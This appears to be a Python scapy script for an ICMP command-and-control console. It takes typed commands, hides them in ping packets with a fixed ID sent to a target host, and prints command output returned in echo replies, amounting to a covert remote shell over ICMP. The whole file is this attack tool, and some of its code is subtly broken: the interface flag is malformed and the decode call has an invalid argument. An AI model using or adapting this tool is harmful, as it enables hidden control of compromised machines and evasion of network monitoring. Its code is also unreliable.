from scapy.all import sr,IP,ICMP,Raw,sniff 
from multiprocessing import Process
import argparse

ICMP_ID = 13170 
time_to_live = 64

#checks arguments passed in by user
parser = argparse.ArgumentParser()
parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP adress")
args = parser.parse_args()
    
def cmd(packet):
    if packet[IP].src == args.destination_ip and packet[ICMP].type == 0 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
        icmpPacket = (packet[Raw].load).decode('utf-8', errors = 'ignore', store = '0')
        print(icmpPacket)
    else:
        pass

def start_sniff():
    sniff(prn=cmd, filter="icmp", store="0")

def main():
    sniffer = Process(target=start_sniff)
    sniffer.start()
    print("[+]ICMP C2 Started")
    while True:
        icmpShell = input('cmd> ')
        if(icmpShell == 'exit'):
            print("[+]Stopping ICMP C2")
            sniffer.terminate()
            break
        elif icmpShell == '':
            pass
        else:
            payload = (IP(dst=args.destination_ip, ttl = time_to_live)/ICMP(type=8, id =ICMP_ID)/Raw(load = icmpShell))
            sr(payload, timeout =0, verbose =0)
    sniffer.join()


if __name__ == "__main__":
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print('[!] Please install the python3 scapy module')
        print('[!] use the command pip3 install scapy')
        exit()

    main()
